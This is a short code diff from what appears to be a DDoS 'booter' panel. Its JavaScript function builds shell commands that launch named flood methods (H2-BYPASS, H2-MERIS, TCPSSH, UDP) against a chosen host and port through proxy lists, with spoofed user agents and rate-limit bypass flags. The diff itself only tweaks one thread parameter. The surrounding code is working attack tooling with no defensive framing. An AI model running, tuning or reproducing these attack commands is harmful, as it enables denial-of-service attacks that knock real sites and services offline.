@@ -54,7 +54,7 @@ const generateCommand = (method, host, port, time) => {
         case 'H2BYPASS':
             return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2MERIS':
-            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
+            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 5 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'TCPSSH':
             return `cd /root/methods && screen -dm node tcpssh.js ${host} ${port} root ${time}`;
         case 'UDP':
